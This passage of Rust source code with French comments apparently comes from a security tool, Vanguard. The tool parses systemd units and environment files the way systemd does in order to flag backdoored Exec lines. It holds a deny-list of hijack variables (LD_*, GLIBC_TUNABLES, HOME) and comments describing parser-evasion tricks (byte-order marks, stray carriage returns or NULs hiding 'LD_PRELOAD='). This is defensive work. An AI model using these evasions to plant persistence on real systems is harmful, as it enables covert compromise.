            continue;
        } else if let Some(r) = apres.strip_prefix('{') {
            let (nom, suite) = r.split_once('}')?;
            (nom, suite)
        } else {
            let n = apres
                .bytes()
                .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
                .count();
            if n == 0 {
                sortie.push('$');
                reste = apres;
                continue;
            }
            (apres.get(..n)?, apres.get(n..)?)
        };
        // HOME posé par l'unité : sa valeur (vérification 3, P3) ; sinon celle du compte, gardée en toutes lettres.
        match variables.and_then(|v| v.get(nom)) {
            Some(v) if !v.contains(CODE_INCONNU) => sortie.push_str(v),
            None if nom == "HOME" => sortie.push_str("$HOME"),
            _ => return None,
        }
        reste = suite;
    }
    sortie.push_str(reste);
    Some(sortie)
}

/// Remplace un code dont la valeur ne se connaît pas sans l'unité chargée (nom de l'unité, instance d'un modèle,
/// chemin de son fichier) : un programme ou un script ainsi nommé n'est pas résolu.
const CODE_INCONNU: char = '\u{1}';

/// La valeur après les codes « % » de systemd, remplacés comme il les remplace avant de couper les mots : les
/// dossiers (%h, %T, %V, %t, %S, %C, %L, %E, %D) par leur valeur, les noms (machine, compte…) par un mot sans chemin,
/// ceux de l'unité (%n, %i, %f, %y…) par `CODE_INCONNU`. `None` : un « % » en fin de valeur.
fn developper_codes(valeur: &str, codes: &Codes) -> Option<String> {
    if !valeur.contains('%') {
        return Some(valeur.to_string());
    }
    let (u, m) = (codes.utilisateur, codes.maison.as_str());
    let mut sortie = String::with_capacity(valeur.len());
    let mut lettres = valeur.chars();
    while let Some(c) = lettres.next() {
        if c != '%' {
            sortie.push(c);
            continue;
        }
        let x = lettres.next()?;
        let dossier = |sous: &str, systeme: &str| if u { format!("{m}/{sous}") } else { systeme.to_string() };
        let v = match x {
            '%' => "%".to_string(),
            'h' => {
                if u {
                    m.to_string()
                } else {
                    "/root".to_string()
                }
            }
            'T' => "/tmp".to_string(),
            'V' => "/var/tmp".to_string(),
            // Le dossier de session du compte : /run/user/<uid> (pam_systemd), qu'il soit ou non celui de la lecture.
            't' if u => uid_du_compte().map_or_else(
                || codes.session.clone().unwrap_or_else(|| CODE_INCONNU.to_string()),
                |uid| format!("/run/user/{uid}"),
            ),
            't' => "/run".to_string(),
            'S' => dossier(".local/state", "/var/lib"),
            'C' => dossier(".cache", "/var/cache"),
            'L' => dossier(".local/state/log", "/var/log"),
            'E' => dossier(".config", "/etc"),
            'D' => dossier(".local/share", "/usr/share"),
            's' => "/bin/sh".to_string(),
            'u' | 'U' | 'g' | 'G' | 'H' | 'l' | 'q' | 'b' | 'm' | 'o' | 'v' | 'w' | 'W' | 'A' | 'B' | 'M' | 'a'
            | 'K' => "x".to_string(),
            _ => CODE_INCONNU.to_string(),
        };
        sortie.push_str(&v);
    }
    Some(sortie)
}

/// Les commandes d'une valeur Exec de systemd (après `developper_codes`) telles qu'il les lance (config_parse_exec,
/// systemd 262) : mots coupés sur les blancs hors guillemets (un guillemet au milieu d'un mot compte), échappements
/// décodés (« \x70 », « \160 », « \s », « \u… »), un mot « ; » non échappé qui sépare deux commandes, les préfixes
/// (« -@:+!| ») ôtés du programme, et le nom donné au programme par « @ » ôté. `None` : une forme que Vanguard ne
/// ramène pas à sa forme finale (guillemet non fermé, échappement inconnu, octet nul, octal au-delà de 255, octets
/// de « \xNN » ou de l'octal qui ne font pas de l'UTF-8).
fn commandes_de_systemd(valeur: &str) -> Option<Vec<Vec<String>>> {
    let mut commandes = commandes_de_systemd_brutes(valeur)?;
    for c in &mut commandes {
        let Some(premier) = c.first_mut() else { continue };
        let net = premier.trim_start_matches(['-', '@', '+', '!', ':', '|']).to_string();
        let nom_donne = premier
            .get(..premier.len().saturating_sub(net.len()))
            .is_some_and(|p| p.contains('@'));
        *premier = net;
        if nom_donne && c.len() > 1 {
            c.remove(1);
        }
    }
    commandes.retain(|c| !c.is_empty());
    Some(commandes)
}

/// `commandes_de_systemd` sans toucher aux préfixes du programme (« -@:+!| ») : la liste permise les lit
/// (`permise::exec_systemd`).
fn commandes_de_systemd_brutes(valeur: &str) -> Option<Vec<Vec<String>>> {
    let mut commandes: Vec<Vec<String>> = Vec::new();
    let mut courante: Vec<String> = Vec::new();
    // Un mot en octets (D-1, revérification 9) : pour systemd, « \xNN » et l'octal sont des octets (« \xc3\xa9 »
    // est « é », pas « Ã© ») ; le mot fini doit faire de l'UTF-8, sinon il n'est pas comparé sûrement.
    let mut mot: Vec<u8> = Vec::new();
    let (mut dans_un_mot, mut litteral) = (false, false);
    let mut guillemet: Option<char> = None;
    let mut tampon = [0_u8; 4];
    let mut lettres = valeur.chars().peekable();
    let chiffres = |lettres: &mut std::iter::Peekable<std::str::Chars<'_>>, n: usize, base: u32| -> Option<u32> {
        let mut v = 0_u32;
        for _ in 0..n {
            v = v.checked_mul(base)?.checked_add(lettres.next()?.to_digit(base)?)?;
        }
        Some(v)
    };
    let lettre = |v: u32| char::from_u32(v).filter(|c| *c != '\0');
    let octet = |v: u32| u8::try_from(v).ok().filter(|o| *o != 0);
    let finir_mot = |mot: &mut Vec<u8>,
                     litteral: &mut bool,
                     courante: &mut Vec<String>,
                     commandes: &mut Vec<Vec<String>>|
     -> Option<()> {
        let fini = String::from_utf8(std::mem::take(mot)).ok()?;
        if fini == ";" && !*litteral {
            commandes.push(std::mem::take(courante));
        } else {
            courante.push(fini);
        }
        *litteral = false;
        Some(())
    };
    while let Some(c) = lettres.next() {
        match (guillemet, c) {
            (Some(q), c) if c == q => guillemet = None,
            (None, '"' | '\'') => {
                guillemet = Some(c);
                dans_un_mot = true;
                litteral = true;
            }
            (None, ' ' | '\t' | '\n' | '\r') => {
                if dans_un_mot {
                    finir_mot(&mut mot, &mut litteral, &mut courante, &mut commandes)?;
                    dans_un_mot = false;
                }
            }
            (_, '\\') => {
                dans_un_mot = true;
                litteral = true;
                // Un « \ » seul en fin de valeur : systemd refuse la ligne ou le garde tel quel ; aucun ne cache le
                // programme.
                let Some(e) = lettres.next() else {
                    mot.push(b'\\');
                    break;
                };
                let x = match e {
                    'x' => {
                        mot.push(octet(chiffres(&mut lettres, 2, 16)?)?);
                        continue;
                    }
                    '0'..='7' => {
                        let reste = chiffres(&mut lettres, 2, 8)?;
                        mot.push(octet(e.to_digit(8)?.checked_mul(64)?.checked_add(reste)?)?);
                        continue;
                    }
                    'a' => '\u{7}',
                    'b' => '\u{8}',
                    'f' => '\u{c}',
                    'n' => '\n',
                    'r' => '\r',
                    't' => '\t',
                    'v' => '\u{b}',
                    's' => ' ',
                    // Un séparateur échappé est lui-même (EXTRACT_UNESCAPE_SEPARATORS).
                    '\\' | '"' | '\'' | ';' | ' ' | '\t' => e,
                    'u' => lettre(chiffres(&mut lettres, 4, 16)?)?,
                    'U' => lettre(chiffres(&mut lettres, 8, 16)?)?,
                    _ => return None,
                };
                mot.extend_from_slice(x.encode_utf8(&mut tampon).as_bytes());
            }
            (_, c) => {
                dans_un_mot = true;
                mot.extend_from_slice(c.encode_utf8(&mut tampon).as_bytes());
            }
        }
    }
    if guillemet.is_some() {
        return None;
    }
    if dans_un_mot {
        finir_mot(&mut mot, &mut litteral, &mut courante, &mut commandes)?;
    }
    commandes.push(courante);
    commandes.retain(|c| !c.is_empty());
    Some(commandes)
}

/// Pourquoi une valeur Exec de systemd (ou de .desktop, `codes` absents) ressemble à une porte dérobée une fois
/// ramenée à la forme que lance systemd (`developper_codes`, `commandes_de_systemd`, chemin simplifié), chaque
/// commande d'une ligne « a ; b » jugée ; ou qu'elle ne s'y ramène pas (`Err`) : non résolue, dite.
fn forme_finale_de_systemd(
    valeur: &str,
    codes: Option<&Codes>,
    maisons: &[&str],
    tout_argument: bool,
) -> Result<Option<&'static str>, ()> {
    let developpee = match codes {
        Some(c) => developper_codes(valeur, c).ok_or(())?,
        None => valeur.to_string(),
    };
    for mots in commandes_de_systemd(&developpee).ok_or(())? {
        let programme = mots.first().map(String::as_str).unwrap_or_default();
        let lit = designes::lit_un_script(programme) || enveloppe(programme);
        if programme.contains(CODE_INCONNU) || (lit && mots.iter().any(|m| m.contains(CODE_INCONNU))) {
            return Err(());
        }
        let jointe = mots.join(" ");
        if let Some(raison) = commande_suspecte_chez(&jointe, true, maisons) {
            return Ok(Some(raison));
        }
        // Les variables de l'unité remplacées, chaque mot jugé comme une commande simple du shell : « sh -c ligne »
        // y est lue comme une ligne de shell.
        let simple = shell::Simple {
            mots: mots
                .iter()
                .map(|m| match developper_variables(m, codes.map(|c| &c.variables)) {
                    Some(texte) => shell::Mot {
                        texte,
                        flou: shell::Flou::Aucun,
                    },
                    None => shell::Mot {
                        texte: m.clone(),
                        flou: shell::Flou::Variable,
                    },
                })
                .collect(),
            entrees: Vec::new(),
        };
        if let Some(raison) = simple_suspecte(&simple, &mut Courant::Maison, maisons, tout_argument, 0)? {
            return Ok(Some(raison));
        }
    }
    Ok(None)
}

/// Les lignes d'une unité ou d'un ajout telles que systemd les lit (`lignes_de_systemd`), leur seul texte.
fn lignes_logiques(texte: &str) -> Vec<String> {
    lignes_de_systemd(texte).into_iter().map(|l| l.texte).collect()
}

/// Une ligne d'unité telle que systemd la lit (`lignes_de_systemd`).
struct LigneDeSystemd {
    /// Le numéro de sa première ligne, compté en « \n » comme dans un éditeur (à partir de 1).
    numero: usize,
    /// Combien de lignes lues par systemd elle joint.
    lues: usize,
    /// Sa première ligne lue, telle qu'écrite.
    premiere: String,
    /// Son texte, joint et sans blancs autour.
    texte: String,
}

/// Les lignes d'une unité, d'un ajout ou d'un .desktop comme les assemble systemd (`config_parse`, systemd 262) :
/// lues par `lignes_lues_par_systemd`, une ligne de commentaire (`commentaire_de_systemd`) sautée (même
/// au milieu d'une ligne continuée), la marque d'ordre des octets ôtée en tête de chaque ligne lue, une ligne qui finit
/// par un « \ » non échappé (« \\ » ne continue pas, « \ » suivi d'un blanc non plus) continuée par la suivante, ce
/// « \ » remplacé par une espace ; une ligne vide finit la continuation, une continuation restée ouverte à la fin du
/// fichier compte. Le texte final perd ses blancs autour (espace, tabulation, « \n », « \r ») ; une ligne vide se saute.
/// Rien de plus joint que par systemd : un « \ » joint en trop cacherait la ligne suivante dans la précédente.
fn lignes_de_systemd(texte: &str) -> Vec<LigneDeSystemd> {
    let mut sortie = Vec::new();
    let mut finir = |mut l: LigneDeSystemd| {
        let net = l.texte.trim_matches(BLANCS_DE_SYSTEMD);
        if !net.is_empty() {
            l.texte = net.to_string();
            sortie.push(l);
        }
    };
    let mut cours: Option<LigneDeSystemd> = None;
    // Le numéro en « \n » d'un octet, compté au fil de la lecture (jamais tout le début à chaque ligne).
    let (mut compte, mut jusqu_a) = (1_usize, 0_usize);
    for (debut, brute) in lignes_lues_par_systemd(texte) {
        compte = compte.saturating_add(texte.get(jusqu_a..debut).map_or(0, |a| a.matches('\n').count()));
        jusqu_a = debut;
        // Le commentaire se cherche avant d'ôter la marque d'ordre des octets (config_parse) : « \u{FEFF}# … \ »
        // n'est pas sauté, il se joint (R-2).
        if commentaire_de_systemd(brute) {
            continue;
        }
        // systemd 262 ôte la marque d'ordre des octets en tête de chaque ligne lue, pas seulement de la première
        // (relecture adverse, C1) : « \u{FEFF}ExecStart=… » au milieu d'une unité est une ligne Exec.
        let l = brute.strip_prefix('\u{FEFF}').unwrap_or(brute);
        let mut ligne = match cours.take() {
            Some(mut c) => {
                c.texte.push_str(l);
                c.lues = c.lues.saturating_add(1);
                c
            }
            None => LigneDeSystemd {
                numero: compte,
                lues: 1,
                premiere: brute.to_string(),
                texte: l.to_string(),
            },
        };
        // L'échappement se lit sur le seul morceau ajouté : le texte d'avant finit par l'espace mise à la place
        // de son « \ », donc sans échappement en cours (systemd relit tout, pour le même résultat).
        let mut echappe = false;
        for c in l.chars() {
            echappe = !echappe && c == '\\';
        }
        if echappe {
            ligne.texte.pop();
            ligne.texte.push(' ');
            cours = Some(ligne);
        } else {
            finir(ligne);
        }
    }
    if let Some(c) = cours {
        finir(c);
    }
    sortie
}

/// Les lignes que lit systemd (`lignes_lues_par_systemd`), chacune avec le numéro (à partir de 0) de la ligne écrite,
/// comptée en « \n », qui la porte.
fn lignes_lues_numerotees(texte: &str) -> Vec<(usize, &str)> {
    let (mut compte, mut jusqu_a) = (0_usize, 0_usize);
    lignes_lues_par_systemd(texte)
        .into_iter()
        .map(|(debut, l)| {
            compte = compte.saturating_add(texte.get(jusqu_a..debut).map_or(0, |a| a.matches('\n').count()));
            jusqu_a = debut;
            (compte, l)
        })
        .collect()
}

/// Les lignes que lit systemd (`read_line`), chacune avec l'octet où elle commence : une fin de ligne est « \n »,
/// « \r » ou « \0 » ; des fins de sortes différentes à la suite (« \r\n », « \n\r », « \n\0 ») n'en font qu'une, la
/// même sorte deux fois en fait deux, et « \0 » finit la sienne aussitôt.
fn lignes_lues_par_systemd(texte: &str) -> Vec<(usize, &str)> {
    let sorte = |b: u8| match b {
        b'\n' => 1_u8,
        b'\r' => 2,
        0 => 4,
        _ => 0,
    };
    let octets = texte.as_bytes();
    let mut lignes = Vec::new();
    let (mut debut, mut i) = (0_usize, 0_usize);
    while let Some(&b) = octets.get(i) {
        let mut vues = sorte(b);
        i = i.saturating_add(1);
        if vues == 0 {
            continue;
        }
        // Les fins de ligne sont de l'ASCII : les bornes tombent entre deux caractères.
        lignes.push((debut, texte.get(debut..i.saturating_sub(1)).unwrap_or_default()));
        while vues & 4 == 0
            && let Some(&b) = octets.get(i)
        {
            let s = sorte(b);
            if s == 0 || vues & s != 0 {
                break;
            }
            vues |= s;
            i = i.saturating_add(1);
        }
        debut = i;
    }
    if debut < octets.len() {
        lignes.push((debut, texte.get(debut..).unwrap_or_default()));
    }
    lignes
}

/// Les lignes Exec*= d'une unité ou d'un ajout : la directive, sa commande, la ligne entière.
fn lignes_exec(texte: &str) -> Vec<(String, String, String)> {
    lignes_logiques(texte)
        .into_iter()
        .filter_map(|l| {
            let (cle, valeur) = l.split_once('=')?;
            let cle = cle.trim_matches([' ', '\t']);
            DIRECTIVES_EXEC
                .contains(&cle)
                .then(|| (cle.to_string(), valeur.trim_matches([' ', '\t']).to_string(), l.clone()))
        })
        .collect()
}

/// La valeur d'une variable permise, sans chemin : un chemin (« LC_ALL=/x », « LANGUAGE=../x ») ferait lire un
/// fichier que rien ne lie. Seul TZ garde un nom de zone (« America/Toronto »), lu sous les zones du système, sans
/// « : » ni « .. » ni chemin absolu (deuxième vérification de la campagne E).
fn valeur_permise(nom: &str, valeur: &str) -> bool {
    if nom == "TZ" {
        return !valeur.starts_with('/')
            && valeur.split('/').all(|p| {
                !p.is_empty() && p != ".." && p.bytes().all(|o| o.is_ascii_alphanumeric() || b"-_+".contains(&o))
            })
            || valeur.is_empty();
    }
    !valeur.contains(['/', '\\'])
}

/// La première directive d'une unité ou d'un ajout qui n'est pas dans la liste fermée (`DIRECTIVES_PERMISES`), ou
/// qui y est avec une valeur hors des permises (une dépendance qui n'est pas une cible, une ligne Exec vide qui
/// efface les précédentes, une variable hors de `variable_permise` ou avec un chemin), telle qu'à montrer.
fn directive_refusee(texte: &str) -> Option<String> {
    let mut section: Option<&str> = None;
    let logiques = lignes_logiques(texte);
    for l in &logiques {
        if let Some(nom) = l.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
            match DIRECTIVES_PERMISES.iter().find(|(s, _)| *s == nom) {
                Some((s, _)) => section = Some(s),
                None => return Some(format!("[{}]", crate::ui::affichable(nom))),
            }
            continue;
        }
        let Some((cle, valeur)) = l.split_once('=') else {
            return Some(crate::ui::couper(&crate::ui::affichable(l), 40));
        };
        let cle = cle.trim_matches([' ', '\t']);
        let valeur = valeur.trim_matches([' ', '\t']);
        let permise = section.is_some_and(|s| {
            DIRECTIVES_PERMISES
                .iter()
                .any(|(n, cles)| *n == s && cles.contains(&cle))
        });
        if !permise {
            return Some(format!("{}=", crate::ui::affichable(cle)));
        }
        if ["Wants", "Requires", "PartOf", "WantedBy"].contains(&cle) && !dependance_permise(valeur) {
            return Some(format!(
                "{cle}={}",
                crate::ui::couper(&crate::ui::affichable(valeur), 40)
            ));
        }
        if DIRECTIVES_EXEC.contains(&cle) && valeur.is_empty() {
            return Some(format!("{cle}= ({})", tr!("vide", "empty")));
        }
        if cle == "Environment" || cle == "PassEnvironment" {
            let Some(mots) = mots_de_systemd(valeur) else {
                return Some(format!("{cle}=\\…"));
            };
            for mot in mots {
                let (nom, v) = mot.split_once('=').unwrap_or((&mot, ""));
                if !variable_permise(nom) || !valeur_permise(nom, v) {
                    return Some(format!("{cle}={}", crate::ui::affichable(nom)));
                }
            }
        }
    }
    None
}

/// Les dossiers où systemd cherche les unités, du plus prioritaire au moins prioritaire (systemd.unit(5)).
fn dossiers_d_unites(r: &Releveur, utilisateur: bool) -> Result<Vec<std::path::PathBuf>, temoins::Refus> {
    let s = |c: &str| r.sous(Path::new(c));
    if !utilisateur {
        return Ok([
            "/etc/systemd/system.control",
            "/run/systemd/system.control",
            "/run/systemd/transient",
            "/run/systemd/generator.early",
            "/etc/systemd/system",
            "/etc/systemd/system.attached",
            "/run/systemd/system",
            "/run/systemd/generator",
            "/usr/local/lib/systemd/system",
            "/usr/lib/systemd/system",
            "/run/systemd/generator.late",
        ]
        .iter()
        .map(|c| s(c))
        .collect());
    }
    let Some(session) = r.runtime.as_deref() else {
        return Err(temoins::Refus(
            tr!(
                "le dossier de la session (XDG_RUNTIME_DIR) est inconnu : ce que systemd y ajoute à l'unité ne se vérifie pas",
                "the session folder (XDG_RUNTIME_DIR) is unknown: what systemd adds to the unit there cannot be checked"
            )
            .to_string(),
        ));
    };
    // Le dossier de session que systemd donne au compte (/run/user/<uid>), s'il n'est pas XDG_RUNTIME_DIR : c'est le
    // seul que le gestionnaire de la session lit, à sa place dans l'ordre (en fin de liste, une unité de
    // /run/user/<uid>/systemd/user passait après celle du système au même nom et `vanguard demarrage` la taisait :
    // relecture 0.94, D-2). Celui de la variable se lit juste après, par prudence.
    let run = |c: &str| -> Vec<std::path::PathBuf> {
        r.session_de_systemd
            .as_deref()
            .into_iter()
            .chain(std::iter::once(session))
            .map(|b| r.sous(&b.join(c)))
            .collect()
    };
    let m = |c: &str| vec![r.maison.join(c)];
    let sy = |c: &str| vec![s(c)];
    // Un XDG_CONFIG_HOME ou XDG_DATA_HOME déplacé : systemd y cherche aussi, en plus des dossiers par défaut (que le
    // gestionnaire de la session lit peut-être, sans ces variables).
    let x = |base: &Option<std::path::PathBuf>, c: &str| -> Vec<std::path::PathBuf> {
        base.iter().map(|b| r.sous(&b.join(c))).collect()
    };
    let liste = |base: &[std::path::PathBuf]| -> Vec<std::path::PathBuf> {
        base.iter().map(|d| r.sous(&d.join("systemd/user"))).collect()
    };
    // Ceux que posent les fichiers du gestionnaire (V-1), juste après ceux de la même variable de Vanguard.
    let gestion = |nom: &str, c: &str| -> Vec<std::path::PathBuf> { du_gestionnaire(r, nom, c) };
    // La liste de systemd (« systemd-analyze --user unit-paths », systemd 262) : chaque XDG_CONFIG_DIRS, puis
    // /etc/xdg ; chaque XDG_DATA_DIRS après ~/.local/share (relecture adverse, B5).
    let mut dossiers: Vec<std::path::PathBuf> = [
        gestion("SYSTEMD_UNIT_PATH", ""),
        m(".config/systemd/user.control"),
        x(&r.config, "systemd/user.control"),
        gestion("XDG_CONFIG_HOME", "systemd/user.control"),
        run("systemd/user.control"),
        run("systemd/transient"),
        run("systemd/generator.early"),
        m(".config/systemd/user"),
        x(&r.config, "systemd/user"),
        gestion("XDG_CONFIG_HOME", "systemd/user"),
        m(".config/systemd/user.attached"),
        x(&r.config, "systemd/user.attached"),
        gestion("XDG_CONFIG_HOME", "systemd/user.attached"),
        liste(&r.config_systeme),
        gestion("XDG_CONFIG_DIRS", "systemd/user"),
        sy("/etc/xdg/systemd/user"),
        sy("/etc/systemd/user"),
        run("systemd/user"),
        run("systemd/user.attached"),
        sy("/run/systemd/user"),
        run("systemd/generator"),
        m(".local/share/systemd/user"),
        x(&r.donnees, "systemd/user"),
        gestion("XDG_DATA_HOME", "systemd/user"),
        liste(&r.donnees_systeme),
        gestion("XDG_DATA_DIRS", "systemd/user"),
        sy("/usr/local/share/systemd/user"),
        sy("/usr/share/systemd/user"),
        sy("/usr/local/lib/systemd/user"),
        sy("/usr/lib/systemd/user"),
        run("systemd/generator.late"),
    ]
    .into_iter()
    .flatten()
    .collect();
    let mut vus = std::collections::BTreeSet::new();
    dossiers.retain(|d| vus.insert(d.clone()));
    Ok(dossiers)
}

/// Les noms des dossiers d'ajout qui s'appliquent à l'unité `nom` : « a-b.service.d », « a-.service.d »,
/// « service.d », et pour une instance « a@.service.d ».
fn ajouts_de(nom: &str) -> Vec<String> {
    let mut noms = vec![format!("{nom}.d")];
    if let Some((base, genre)) = nom.rsplit_once('.') {
        for (i, _) in base.match_indices('-') {
            if let Some(p) = base.get(..=i) {
                noms.push(format!("{p}.{genre}.d"));
            }
        }
        if let Some((gabarit, _)) = base.split_once('@') {
            noms.push(format!("{gabarit}@.{genre}.d"));
        }
        noms.push(format!("{genre}.d"));
    }
    noms.sort();
    noms.dedup();
    noms
}

/// Un complément (« nom.d/*.conf », « préfixe-.service.d », « service.d »…) s'ajoute à l'unité `nom` du compte dans un
/// dossier que lit systemd, hors de ceux que seul root peut changer (`de_root_seul`) : un fichier `.conf`, un dossier
/// de compléments qui ne se lit pas ou qui est autre chose qu'un dossier, ou la liste des dossiers qui ne se dresse
/// pas. Un dossier vide ne compte pas. Pour la sauvegarde de Vanguard (D-1) : `Environment=HOME=…` y déplacerait le
/// ~/.popt que lit rsync.
///
/// Sous tous les noms de l'unité (F-3, relecture 0.94) : systemd applique aussi à une unité les compléments de ses
/// alias, un lien `copie.service` → `nom` posé dans un dossier d'unités suffit (vu avec `systemd-analyze --user
/// verify`) ; et ceux du fichier que vise `nom` s'il est lui-même un lien. Un dossier d'unités qui ne se lit pas : vrai.
fn complements_du_compte(r: &Releveur, nom: &str) -> bool {
    let Ok(dossiers) = dossiers_d_unites(r, true) else {
        return true;
    };
    let Some(noms) = noms_de_l_unite(&dossiers, nom) else {
        return true;
    };
    dossiers.iter().any(|d| {
        noms.iter().flat_map(|n| ajouts_de(n)).any(|a| {
            let dossier = d.join(a);
            match std::fs::symlink_metadata(&dossier) {
                Err(e) => e.kind() != std::io::ErrorKind::NotFound,
                Ok(m) if !m.is_dir() => !de_root_seul(&dossier),
                Ok(_) => match std::fs::read_dir(&dossier) {
                    Err(_) => true,
                    Ok(entrees) => entrees
                        .into_iter()
                        .any(|e| e.map_or(true, |e| a_l_extension(&e.path(), "conf") && !de_root_seul(&e.path()))),
                },
            }
        })
    })
}

/// Les noms sous lesquels systemd connaît l'unité `nom` dans `dossiers` : le sien, celui de chaque lien d'un de ces
/// dossiers qui vise (par son nom de fichier, de lien en lien) un nom déjà connu, et celui que vise `nom` s'il est un
/// lien. `None` : un dossier qui existe mais ne se lit pas, ou une chaîne de liens trop longue (rien n'est conclu).
fn noms_de_l_unite(dossiers: &[std::path::PathBuf], nom: &str) -> Option<Vec<String>> {
    let mut liens: Vec<(String, String)> = Vec::new();
    for d in dossiers {
        let entrees = match std::fs::read_dir(d) {
            Ok(e) => e,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(_) => return None,
        };
        for e in entrees {
            let e = e.ok()?;
            if !e.file_type().ok()?.is_symlink() {
                continue;
            }
            let vise = std::fs::read_link(e.path()).ok()?;
            let vise = vise
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            liens.push((e.file_name().to_string_lossy().into_owned(), vise));
        }
    }
    let mut noms = vec![nom.to_string()];
    for _ in 0..=liens.len().min(64) {
        let avant = noms.len();
        for (lien, vise) in &liens {
            if noms.contains(vise) && !noms.contains(lien) {
                noms.push(lien.clone());
            }
            if noms.contains(lien) && !vise.is_empty() && !noms.contains(vise) {
                noms.push(vise.clone());
            }
        }
        if noms.len() == avant {
            return Some(noms);
        }
    }
    None
}

/// Une variable qui change ce que lit ou lance la sauvegarde de Vanguard, posée à son gestionnaire (F-1) : HOME (rsync
/// lit le ~/.popt de ce dossier-là), celles que lisent rsync, popt, findmnt et ses bibliothèques (libmount, libblkid,
/// libsmartcols), libcrypto (que rsync charge), et le chargeur de programmes (LD_*, GLIBC_TUNABLES…).
///
/// `vide` : la forme de la 0.95, qui lance rsync et findmnt par « env -i » : seul env garde l'environnement du
/// gestionnaire, et seul le chargeur le lit pour lui (LD_*, GLIBC_TUNABLES). Seules les variables écrites dans un
/// fichier se jugent : celles qu'un programme pose au gestionnaire en cours de session (systemctl --user
/// set-environment, import d'uwsm) ne se voient pas, et le texte de la sauvegarde le dit (relecture 0.95, V-3).
fn variable_de_la_sauvegarde(nom: &str, vide: bool) -> bool {
    const DEBUTS: [&str; 8] = [
        "LD_",
        "RSYNC_",
        "POPT",
        "BLKID_",
        "LIBBLKID_",
        "LIBMOUNT_",
        "LIBSMARTCOLS_",
        "OPENSSL_",
    ];
    if vide {
        return nom.starts_with("LD_") || nom == "GLIBC_TUNABLES";
    }
    ["HOME", "GLIBC_TUNABLES", "LOCPATH", "GCONV_PATH"].contains(&nom) || DEBUTS.iter().any(|d| nom.starts_with(d))
}

/// Le texte d'un fichier de variables nomme une `variable_de_la_sauvegarde` ailleurs qu'en la lisant (« $HOME »,
/// « ${HOME} », « @{HOME} ») et hors d'une ligne de commentaire : l'écrire, de quelque forme que ce soit (« HOME=… »,
/// « HOME = … », « export HOME… », « HOME OVERRIDE=… » de pam_env, « DefaultEnvironment="HOME=…" »). Le texte tel
/// qu'écrit, ses lignes continuées par « \ » jointes, et chacun décodé (« \x4d ») : un nom coupé ou échappé se
/// voit aussi. Plus large que ce que chaque lecteur accepte : un faux positif lève, il ne tait jamais.
fn nomme_une_variable_de_la_sauvegarde(texte: &str, vide: bool) -> bool {
    !noms_ecrits(texte, |n| variable_de_la_sauvegarde(n, vide)).is_empty()
}

/// Un fichier de la sorte `sorte` est au format de systemd (environment.d, /etc/environment, pam_env, user.conf et
/// ses compléments), dont le lecteur coupe un enregistrement aussi sur un retour chariot seul ou un NUL
/// (`enregistrements`).
fn format_systemd(sorte: Variables) -> bool {
    matches!(sorte, Variables::Cles | Variables::Systemd)
}

/// Les enregistrements d'une ligne lue par `lines()` (coupée au seul « \n ») : au format de systemd, coupée aussi sur
/// chaque retour chariot seul, comme la coupe systemd, où un « # » ne commente que jusque-là (campagne 0.95, angle
/// lecture, L-1 : « #x⏎LD_PRELOAD=… » posait la variable sans être lu). Le shell (profils, uwsm) et popt ne coupent
/// pas là, mesuré : leur ligne reste entière. pam_env n'est pas mesuré : coupé, le côté sûr (un faux positif lève).
/// Un octet NUL coupe aussi (re-contrôle 0.95, R-1) : `read_line` de systemd 262 (fileio.c) finit une ligne sur
/// « \n », « \r » ou NUL, et user.conf applique « #n␀ManagerEnvironment=… ». Le générateur d'environment.d, lui,
/// s'arrête au premier NUL (env-file.c) : la suite lue ici en plus ne peut que lever.
fn enregistrements(ligne: &str, systemd: bool) -> Vec<&str> {
    if systemd {
        ligne.split(FINS_DE_SYSTEMD).collect()
    } else {
        vec![ligne]
    }
}

/// Ce qui finit un enregistrement au format de systemd en plus du « \n » (`enregistrements`).
const FINS_DE_SYSTEMD: [char; 2] = ['\r', '\0'];

/// Le texte d'un fichier de la sorte `sorte`, chaque retour chariot seul et chaque NUL changés en fin de ligne au
/// format de systemd (`enregistrements`) ; tel quel sinon. user.conf (`Variables::Systemd`) : ses lignes exactement
/// comme les lit `read_line` (`lignes_lues_par_systemd`), une par « \n » : « \r\n », « \r␀ » ne font qu'une fin, et
/// « \ » + « \r\n » continue la ligne (re-contrôle 0.95, R-2).
fn coupe_comme_systemd(texte: &str, sorte: Variables) -> String {
    if !format_systemd(sorte) {
        return texte.to_string();
    }
    if sorte == Variables::Systemd {
        return lignes_lues_par_systemd(texte)
            .into_iter()
            .map(|(_, l)| l)
            .collect::<Vec<_>>()
            .join("\n");
    }
    let mut coupe = String::with_capacity(texte.len());
    let mut caracteres = texte.chars().peekable();
    while let Some(c) = caracteres.next() {
        coupe.push(if c == '\0' || (c == '\r' && caracteres.peek() != Some(&'\n')) {
            '\n'
        } else {
            c
        });
    }
    coupe
}

/// Les noms que `cible` retient et que le texte écrit ailleurs qu'en les lisant (`nomme_une_variable_de_la_sauvegarde`).
fn noms_ecrits(texte: &str, cible: impl Fn(&str) -> bool) -> std::collections::BTreeSet<String> {
    let jointe = texte.replace("\\\n", "");
    let mut noms = std::collections::BTreeSet::new();
    for l in [texte.to_string(), decodee(texte), decodee(&jointe), jointe]
        .iter()
        .flat_map(|t| t.lines().map(str::to_string).collect::<Vec<_>>())
        // R-2 : seuls les blancs de systemd se sautent avant « # » ou « ; » ; « \x0c# … » se lit (un shell non
        // plus ne commente pas là). Plus de lignes lues, jamais moins.
        .filter(|l| !commentaire_de_systemd(l))
    {
        let octets = l.as_bytes();
        let mot = |c: u8| c.is_ascii_alphanumeric() || c == b'_';
        let mut i = 0usize;
        while i < octets.len() {
            if !octets.get(i).copied().is_some_and(mot) {
                i = i.saturating_add(1);
                continue;
            }
            let debut = i;
            while octets.get(i).copied().is_some_and(mot) {
                i = i.saturating_add(1);
            }
            let avant = debut.checked_sub(1).and_then(|a| octets.get(a)).copied();
            let avant2 = debut.checked_sub(2).and_then(|a| octets.get(a)).copied();
            let lue = avant == Some(b'$') || (avant == Some(b'{') && matches!(avant2, Some(b'$' | b'@')));
            if let Some(n) = l.get(debut..i).filter(|n| !lue && cible(n)) {
                noms.insert(n.to_string());
            }
        }
    }
    noms
}

/// F-1 (relecture 0.94) : un fichier qui pose des variables au gestionnaire de systemd du compte, donc à la sauvegarde
/// de Vanguard, nomme une `variable_de_la_sauvegarde` ou ne se lit pas en entier, ou, pour un script d'uwsm, cache ce
